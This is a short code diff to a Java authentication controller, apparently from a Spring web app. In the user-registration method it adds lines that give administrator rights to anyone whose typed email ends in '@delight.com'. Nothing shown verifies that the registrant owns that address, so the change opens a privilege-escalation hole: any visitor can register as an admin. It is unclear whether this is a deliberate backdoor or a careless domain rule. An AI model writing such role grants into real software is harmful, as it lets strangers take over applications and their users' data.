@@ -58,7 +58,11 @@ public class AuthController {
         user.setName(request.getName());
         user.setEmail(request.getEmail());
         user.setPasswordHash(passwordEncoder.encode(request.getPassword()));
-        user.setRoles(Set.of(Role.USER));
+        if (request.getEmail() != null && request.getEmail().toLowerCase().endsWith("@delight.com")) {
+            user.setRoles(Set.of(Role.USER, Role.ADMIN));
+        } else {
+            user.setRoles(Set.of(Role.USER));
+        }
         userRepository.save(user);
 
         return "redirect:/login?registered";
